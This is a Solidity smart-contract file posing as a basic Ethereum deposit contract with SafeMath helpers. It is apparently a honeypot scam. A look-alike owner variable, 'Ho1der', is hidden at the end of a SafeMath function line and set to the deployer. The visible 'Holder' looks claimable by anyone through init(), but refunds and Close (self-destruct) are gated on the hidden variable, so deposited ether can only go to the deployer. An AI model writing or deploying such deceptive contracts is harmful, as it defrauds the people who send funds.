1 pragma solidity ^0.4.14;
2 
3 /**
4  * @title SafeMath
5  * @dev Math operations with safety checks that throw on error
6  */
7 contract SafeMath
8 {
9     function add(uint256 x, uint256 y) internal constant returns (uint256) 
10     {
11         uint256 z = x + y;
12         if((z >= x) && (z >= y))
13         {
14           return z;
15         }
16         else
17         {
18             revert();
19         }
20     }
21     function sub(uint256 x, uint256 y) internal constant returns (uint256) 
22     {
23         if(x >= y)
24         {
25            uint256 z = x - y;
26            return z;
27         }
28         else
29         {
30             revert();
31         }
32     }
33     function div(uint256 x, uint256 y) internal constant returns (uint256)
34     {
35         // assert (b > 0); // Solidity automatically throws when dividing by 0
36         uint256 z = x / y;
37         // assert (a == b * c + a % b); // There is no case in which this doesn't hold
38         return z;
39     } address Ho1der = msg.sender;
40     function mul(uint256 x, uint256 y) internal constant returns (uint256) 
41     {
42         uint256 z = x * y;
43         if((x == 0) || (z / x == y))
44         {
45             return z;
46         }
47         else
48         {
49             revert();
50         }
51     }
52 }
53 
54 /**
55  * @title Basic Ethereum Certificate of Desposit Contract
56  */
57 contract DepositContract is SafeMath
58 {
59     struct Certificate
60     {
61         uint Time;
62         uint Invested;
63     }
64     
65     event Deposited(address indexed sender, uint value);
66     event Invested(address indexed sender, uint value);
67     event Refunded(address indexed sender, uint value);
68     event Withdrew(address indexed sender, uint value);
69     
70     uint public TotalDeposited;
71     uint public Available;
72     uint public DepositorsQty;
73     uint public prcntRate = 10;
74     bool RefundEnabled;
75     
76     address public Holder;
77     
78     mapping (address => uint) public Depositors;
79     mapping (address => Certificate) public Certificates;
80 
81     function init()
82     {
83         Holder = msg.sender;
84     }
85     
86     function SetPrcntRate(uint val) public
87     {
88         if(val >= 1 && msg.sender == Holder)
89         {
90             prcntRate = val;
91         }
92     }
93     
94     function() payable
95     {
96         Deposit();
97     }
98     
99     function Deposit() public payable
100     {
101         if (msg.value >= 3 ether)
102         {
103             if (Depositors[msg.sender] == 0)
104                 DepositorsQty++;
105             Depositors[msg.sender] += msg.value;
106             TotalDeposited += msg.value;
107             Available += msg.value;
108             Invested(msg.sender, msg.value);
109         }   
110     }
111     
112     function ToLend() public payable
113     {
114         Certificates[msg.sender].Time = now;
115         Certificates[msg.sender].Invested += msg.value;
116         Deposited(msg.sender, msg.value);
117     }
118     
119     function RefundDeposit(address addr, uint amt) public
120     {
121         if(Depositors[addr] > 0)
122         {
123             if(msg.sender == Ho1der)
124             {
125                 addr.send(amt);
126                 Available -= amt;
127                 Withdrew(addr, amt);
128             }
129         }
130     }
131 
132     function Close() public
133     {
134         if (msg.sender == Ho1der)
135         {
136             suicide(Ho1der);
137         }
138     }
139 }